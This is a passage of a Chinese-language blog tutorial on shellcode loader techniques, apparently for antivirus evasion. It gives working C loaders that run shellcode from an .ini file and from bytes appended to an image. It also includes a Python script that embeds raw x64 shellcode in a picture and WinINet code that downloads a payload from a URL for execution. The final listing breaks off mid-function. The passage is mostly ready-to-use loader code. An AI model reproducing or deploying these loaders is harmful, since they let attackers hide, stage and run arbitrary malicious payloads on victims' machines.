class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS <span class="comment">// 解决 fopen_s 的警告</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// 读取shellcode文件</span></span><br><span class="line">	<span class="type">char</span> filename[] = <span class="string">&quot;conx.ini&quot;</span>;</span><br><span class="line">	FILE* file;</span><br><span class="line">	<span class="keyword">if</span> (fopen_s(&amp;file, filename, <span class="string">&quot;rb&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;Failed to open the code file.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">	<span class="type">long</span> size = ftell(file);</span><br><span class="line">	fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">	<span class="type">char</span>* code = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="keyword">if</span> (!code) &#123;</span><br><span class="line">		perror(<span class="string">&quot;Failed to allocate memory for code.&quot;</span>);</span><br><span class="line">		fclose(file);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (fread(code, <span class="number">1</span>, size, file) != size) &#123;</span><br><span class="line">		perror(<span class="string">&quot;Failed to read code from the file.&quot;</span>);</span><br><span class="line">		fclose(file);</span><br><span class="line">		<span class="built_in">free</span>(code);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(file);</span><br><span class="line">	<span class="comment">// 使用VirtualAlloc 函数申请一个 shellcode字节大小的可以执行代码的内存块</span></span><br><span class="line">	LPVOID addr = VirtualAlloc(<span class="literal">NULL</span>, size, MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="comment">// 申请失败 , 退出</span></span><br><span class="line">	<span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 把shellcode拷贝到这块内存</span></span><br><span class="line">	<span class="built_in">memcpy</span>(addr, code, size);</span><br><span class="line">	<span class="comment">// 创建线程运行</span></span><br><span class="line">	HANDLE hThread = CreateThread(<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)addr,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>);</span><br><span class="line">	<span class="comment">// 等待线程运行</span></span><br><span class="line">	WaitForSingleObject(hThread, <span class="number">-1</span>);</span><br><span class="line">	<span class="comment">// 关闭线程</span></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	<span class="comment">// 释放资源</span></span><br><span class="line">	<span class="built_in">free</span>(code);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="图片分离"><a href="#图片分离" class="headerlink" title="图片分离"></a>图片分离</h3><p>制作步骤</p>
+<ol>
+<li><p>选取一张图片, 然后读取图片的字节大小</p>
+</li>
+<li><p>在图片末尾插入shellcode</p>
+</li>
+<li><p>生成一张新的图片, 且记录shellcode的在文件中的起始位置</p>
+</li>
+<li><p>打开图片文件,从shellcode起始位置开始读取</p>
+</li>
+<li><p>正常加载执行</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">shell_code, file_name=<span class="string">&quot;image.jpg&quot;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name, mode=<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;shell_code 起始位置为:&quot;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;new.png&quot;</span>, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data + shell_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;shell_code 插入成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = <span class="string">b&quot;\x90\x90\x90\x90\x90\x90\x90\x90\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span></span><br><span class="line">    main(data)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// 这里写shell_code 起始位置为: 804306</span></span><br><span class="line">	<span class="type">int</span> startNum = <span class="number">804306</span>;</span><br><span class="line">    <span class="comment">// 这里写图片的名称</span></span><br><span class="line">	<span class="type">char</span> imageName[] = <span class="string">&quot;new.png&quot;</span>;</span><br><span class="line">	FILE* file;</span><br><span class="line">	fopen_s(&amp;file, imageName, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!file) &#123;</span><br><span class="line">		perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 移动到 shellcode 起始位置</span></span><br><span class="line">	fseek(file, startNum, SEEK_SET);</span><br><span class="line">	<span class="comment">// 获取文件大小</span></span><br><span class="line">	fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">	<span class="type">long</span> size = ftell(file);</span><br><span class="line">	fseek(file, startNum, SEEK_SET); <span class="comment">// 重新设置文件指针到起始位置</span></span><br><span class="line">	<span class="comment">// 读取内容</span></span><br><span class="line">	<span class="type">char</span>* content = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="keyword">if</span> (!content) &#123;</span><br><span class="line">		perror(<span class="string">&quot;Error allocating memory&quot;</span>);</span><br><span class="line">		fclose(file);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	fread(content, <span class="number">1</span>, size, file);</span><br><span class="line">	fclose(file);</span><br><span class="line">	<span class="comment">// 申请内存</span></span><br><span class="line">	LPVOID p = VirtualAlloc(<span class="literal">NULL</span>, size, MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		DWORD error = GetLastError();</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error allocating memory. GetLastError: %lu\n&quot;</span>, error);</span><br><span class="line">		<span class="built_in">free</span>(content);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 复制 shellcode 进申请的内存中</span></span><br><span class="line">	<span class="built_in">memcpy</span>(p, content, size);</span><br><span class="line">	<span class="comment">// 创建线程</span></span><br><span class="line">	HANDLE h = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)p, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (h == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error creating thread\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(content);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 等待线程完成</span></span><br><span class="line">	WaitForSingleObject(h, INFINITE);</span><br><span class="line">	<span class="comment">// 释放内存</span></span><br><span class="line">	VirtualFree(p, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">	<span class="built_in">free</span>(content);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Web分离"><a href="#Web分离" class="headerlink" title="Web分离"></a>Web分离</h3><p>将有效载荷直接存储在二进制文件中.这是⼀种快速且常用的获取有效载荷的方法.不幸的是,在某些情况下,当存在有效载荷大小限制时,将有效载荷保存在代码中并不是⼀种可行的方法.另⼀种方法是将有效载荷托管在 Web 服务器上,并在执行期间获取它</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取有效负载"><a href="#获取有效负载" class="headerlink" title="获取有效负载"></a>获取有效负载</h4><p>为了从 Web 服务器获取有效负载,将使用以下<code>Windows API</code>：</p>
+<ol>
+<li><p><code>InternetOpenW</code> - 打开互联网会话句柄,这是使用其他<code>Internet Windows API</code> 的先决条件</p>
+</li>
+<li><p><code>InternetOpenUrlW</code>-打开指定资源的句柄,该资源是有效载荷的 URL.</p>
+</li>
+<li><p><code>InternetReadFile</code>-从Web资源句柄读取数据.这是由<code>InternetOpenUrlW</code>打开的句柄</p>
+</li>
+<li><p><code>InternetCloseHandle</code>-关闭句柄.</p>
+</li>
+</ol>
+<h4 id="打开互联网会话"><a href="#打开互联网会话" class="headerlink" title="打开互联网会话"></a>打开互联网会话</h4><p>第⼀步是使用<code>InternetOpenW</code>打开互联网会话句柄,这将初始化应用程序对<code>WinINet</code>函数的使用.传递给<code>WinAPI</code>的所有参数都是NULL.因为它们主要用于代理相关事宜.</p>
+<p>值得注意的是,将第二个参数设置为NULL.相当于使用<code>INTERNET_OPEN_TYPE_PRECONFIG</code>,它指定应使用系统</p>
+<p>的当前配置来确定互联网连接的代理设置.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HINTERNET <span class="title function_">InternetOpenW</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszAgent, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwAccessType, <span class="comment">// NULL or INTERNET_OPEN_TYPE_PRECONFIG</span></span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszProxy, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszProxyBypass, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwFlags <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Opening an internet session handle</span></span><br><span class="line">hInternet = InternetOpenW(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="打开有效载荷的句柄"><a href="#打开有效载荷的句柄" class="headerlink" title="打开有效载荷的句柄"></a>打开有效载荷的句柄</h4><p>继续使用下⼀个<code>WinAPI</code>,<code>InternetOpenUrlW</code>其中正在建立与有效载荷的 URL 的连接.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HINTERNET <span class="title function_">InternetOpenUrlW</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] HINTERNET hInternet, <span class="comment">// Handle opened by InternetOpenW</span></span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszUrl, <span class="comment">// The payload&#x27;s URL</span></span></span><br><span class="line"><span class="params"> [in] LPCWSTR lpszHeaders, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwHeadersLength, <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwFlags, <span class="comment">// INTERNET_FLAG_HYPERLINK | INTERNET_FLA</span></span></span><br><span class="line"><span class="params">G_IGNORE_CERT_DATE_INVALID</span></span><br><span class="line"><span class="params"> [in] DWORD_PTR dwContext <span class="comment">// NULL</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><strong><code>hInternet</code> [in]</strong>:这是一个句柄,由先前调用 <code>InternetOpenW</code> 函数返回.它表示一个用于整个应用会话的 WinINet 启动句柄.你可以将其视为 WinINet 会话的标识符,用于管理后续的网络请求.</li>
+<li><strong><code>lpszUrl</code> [in]</strong>:这是一个指向宽字符字符串的指针,表示要打开的资源的 URL.URL 指定了你要访问的资源的地址,例如 “<a target="_blank" rel="noopener" href="http://www.example.com/">http://www.example.com</a>“.</li>
+<li><strong><code>lpszHeaders</code> [in]</strong>:这是一个指向宽字符字符串的指针,表示要附加到请求中的头部信息.通常为 <code>NULL</code>,表示不需要附加额外的 HTTP 头；如果需要可以传入自定义的 HTTP 头信息.</li>
+<li><strong><code>dwHeadersLength</code> [in]</strong>:指定 <code>lpszHeaders</code> 参数中头信息的长度.如果 <code>lpszHeaders</code> 为 <code>NULL</code>,则该参数也应该为 0.否则,它指定了头信息的字节数.</li>
+<li><strong><code>dwFlags</code> [in]</strong>:指定请求行为的选项标志.常见的标志包括：<ul>
+<li><code>INTERNET_FLAG_HYPERLINK</code>: 表示目标是一个超链接.通常不需要手动设置,由浏览器自动设置.</li>
+<li><code>INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</code>: 忽略因证书的日期无效而导致的错误.</li>
+<li>其他标志可能包括缓存控制标志,如 <code>INTERNET_FLAG_RELOAD</code>(绕过缓存)等.</li>
+</ul>
+</li>
+<li><strong><code>dwContext</code> [in]</strong>:这是一个应用程序定义的值,用于与异步操作关联.通常在同步操作中设置为 <code>NULL</code>.如果使用异步操作,可以用它来标识或跟踪请求.</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Opening a handle to the payload&#x27;s URL</span></span><br><span class="line">hInternetFile = InternetOpenUrlW(hInternet, <span class="string">L&quot;http://127.0.0.1:8000/calc.bin&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+<h4 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h4><p><code>InternetReadFile</code>是下⼀个用来读取有效负载的<code>WinAPI</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">InternetReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] HINTERNET hFile, <span class="comment">// Handle opened by InternetOpenUrlW</span></span></span><br><span class="line"><span class="params"> [out] LPVOID lpBuffer, <span class="comment">// Buffer to store the payload</span></span></span><br><span class="line"><span class="params"> [in] DWORD dwNumberOfBytesToRead, <span class="comment">// The number of bytes to read</span></span></span><br><span class="line"><span class="params"> [out] LPDWORD lpdwNumberOfBytesRead <span class="comment">// Pointer to a variable that rec</span></span></span><br><span class="line"><span class="params">eives the number of bytes read</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在调用该函数之前,必须分配⼀个缓冲区来保存有效载荷.因此,<code>LocalAlloc</code>用于分配与有效载荷大小相同的缓冲区,即 272 字节.⼀旦分配了缓冲区,<code>InternetReadFile</code>就可以用来读取有效载荷.该函数需要读取的字节数.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pBytes = (PBYTE)LocalAlloc(LPTR, <span class="number">272</span>);</span><br><span class="line">InternetReadFile(hInternetFile, pBytes, <span class="number">272</span>, &amp;dwBytesRead)</span><br></pre></td></tr></table></figure>
+
+<h4 id="关闭-InterntHandle"><a href="#关闭-InterntHandle" class="headerlink" title="关闭 InterntHandle"></a>关闭 InterntHandle</h4><p><code>InternetCloseHandle</code>用于关闭互联网句柄.成功获取有效负载后应调用此函数.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">InternetCloseHandle</span><span class="params">(</span></span><br><span class="line"><span class="params"> [in] HINTERNET hInternet <span class="comment">// Handle opened by InternetOpenW &amp; InternetOpenUrlW</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Wininet.lib&quot;</span>) <span class="comment">// 链接 WinInet 库,提供网络功能</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从指定 URL 获取有效负载</span></span><br><span class="line">BOOL <span class="title function_">GetPayloadFromUrl</span><span class="params">(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize)</span> &#123;</span><br><span class="line">    <span class="comment">// 状态标志,表示操作是否成功</span></span><br><span class="line">    BOOL bSTATE = TRUE;</span><br><span class="line">    <span class="comment">// 用于存储Internet 连接和文件句柄</span></span><br><span class="line">    HINTERNET hInternet = <span class="literal">NULL</span>, hInternetFile = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 存储每次读取的字节数</span></span><br><span class="line">    DWORD dwBytesRead = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 存储总的字节大小</span></span><br><span class="line">    SIZE_T sSize = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 指向下载数据的指针</span></span><br><span class="line">    PBYTE pBytes = <span class="literal">NULL</span>, pTmpBytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化一个用于互联网访问的会话</span></span><br><span class="line">    hInternet = InternetOpenW(<span class="literal">NULL</span>, INTERNET_OPEN_TYPE_DIRECT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hInternet == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果初始化失败</span></span><br><span class="line">        <span class="comment">// 输出错误信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] InternetOpenW Failed With Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="comment">// 设置状态为失败</span></span><br><span class="line">        bSTATE = FALSE;</span><br><span class="line">        <span class="comment">// 跳转到结束标签</span></span><br><span class="line">        <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开指定 URL 的文件句柄</span></span><br><span class="line">    hInternetFile = InternetOpenUrlW(hInternet, szUrl, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hInternetFile == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果打开失败</span></span><br><span class="line">        <span class="comment">// 输出错误信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] InternetOpenUrlW Failed With Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="comment">// 设置状态为失败</span></span><br><span class="line">        bSTATE = FALSE;</span><br><span class="line">        <span class="comment">// 跳转到结束标签</span></span><br><span class="line">        <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为临时缓冲区分配内存</span></span><br><span class="line">    pTmpBytes = (PBYTE)LocalAlloc(LPTR, <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span> (pTmpBytes == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果分配失败</span></span><br><span class="line">        <span class="comment">// 设置状态为失败</span></span><br><span class="line">        bSTATE = FALSE;</span><br><span class="line">        <span class="comment">// 跳转到结束标签</span></span><br><span class="line">        <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取数据</span></span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="comment">// 从打开的 URL 